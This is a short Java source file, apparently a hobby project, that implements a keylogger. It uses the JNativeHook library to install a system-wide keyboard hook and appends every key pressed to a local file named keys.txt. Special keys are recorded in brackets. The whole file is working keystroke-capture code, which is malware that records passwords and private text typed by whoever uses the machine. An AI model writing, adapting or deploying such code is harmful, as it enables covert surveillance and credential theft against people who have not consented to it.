import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
// starting the journey
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public abstract  class keylogger implements NativeKeyListener {
    private static final Path file=Paths.get("keys.txt");// to create a folder or directory

    public static void main(String[] args) {
        try{
            GlobalScreen.registerNativeHook();
        }
        catch (NativeHookException e){
            System.exit(-1);
        }
        GlobalScreen.addNativeKeyListener(new keylogger() {
            @Override
            public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {

            }
        });
    }
    public void nativeKeyPressed(NativeKeyEvent e){
        String keytext=NativeKeyEvent.getKeyText(e.getKeyCode());
        try(OutputStream os= Files.newOutputStream(file,StandardOpenOption.CREATE,StandardOpenOption.WRITE,StandardOpenOption.APPEND);PrintWriter writer =new PrintWriter(os)){
            if(keytext.length()>1){
                writer.print("["+keytext+"]");
            }
            else{
                writer.print(keytext);
            }
        }
        catch(IOException ex ){
            System.exit(-1);

        }
    }
    public void nativeKeyReleased(NativeKeyEvent e){

    }
    public void nativeKeyTyped(NativeKeyEvent e){

    }

}
 